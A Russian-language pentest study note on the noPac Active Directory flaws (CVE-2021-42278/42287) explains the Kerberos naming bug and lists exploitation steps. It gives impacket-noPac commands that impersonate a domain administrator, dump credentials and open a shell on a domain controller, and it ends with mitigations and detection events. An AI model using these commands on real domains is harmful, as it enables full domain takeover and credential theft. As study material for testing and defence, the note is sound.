#windows #AD #vulnerabilities 

**CVE-2021-42278
CVE-2021-42287**
### Возникновение уязвимости

Комплексная логическая ошибка в работе протокола Kerberos и механизмах переименования объектов в Active Directory.

1. **CVE-2021-42278:** Позволяет обычному пользователю изменять атрибут `sAMAccountName` созданной им учетной записи компьютера на имя, которое **не заканчивается символом `$`** (по стандарту все имена компьютеров должны иметь `$` в конце, например `DC01$`).

2. **CVE-2021-42287:** Ошибка в Центре распределения ключей (KDC). Если пользователь запрашивает сервисный билет (TGS), используя TGT, выданный на имя компьютера без `$`, и KDC не находит такой объект, он **автоматически пытается найти его снова, добавляя `$` в конце**.

### Эксплуатация

Злоумышленник, имеющий права обычного пользователя домена:

1. Создает новую учетную запись компьютера (по умолчанию `MachineAccountQuota` позволяет до 10 штук).
2. Переименовывает её, имитируя имя Контроллера Домена, но **без знака `$`** (например, вместо `DC01$` пишет `DC01`).
3. Запрашивает билет TGT для этой учетки.
4. Переименовывает свою учетку обратно в любое другое имя.
5. Запрашивает сервисный билет (TGS) через полученный ранее TGT.
6. KDC не находит старое имя `DC01`, добавляет `$` и находит... **настоящий Контроллер Домена**. KDC выдает пользователю билет с правами Администратора Домена, думая, что это сам контроллер обращается к себе.

- Проверка системы на уязвимость к `NoPac`
```bash
sudo python3 /opt/noPac/scanner.py <domain>/<user>:<pass> -dc-ip <dc-ip> -use-ldap
```

- Проведение [[DCSync]]
```bash
impacket-noPac domain.local/user:password -dc-ip 192.168.1.10 --impersonate administrator -dump -dc-host ACADEMY-EA-DC01 -use-ldap
```

- Вход через оболочку
```bash
impacket-noPac domain.local/user:password -dc-ip 192.168.1.10 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

### Импакт

Мгновенное повышение привилегий от обычного пользователя до **Domain Admin** (полный захват домена) менее чем за минуту.

### Уязвимые версии:

Все версии Windows Server, начиная с 2008 R2 и до 2019/2022 (до выхода патчей).

### Защита

- Установить патчи
- Изменить значение атрибута `ms-DS-MachineAccountQuota` на **0**, чтобы обычные пользователи не могли создавать учетки компьютеров в домене.
- Мониторить события **4662** (операция над объектом) и **4781** (изменение имени учетной записи), где имя не содержит `$`
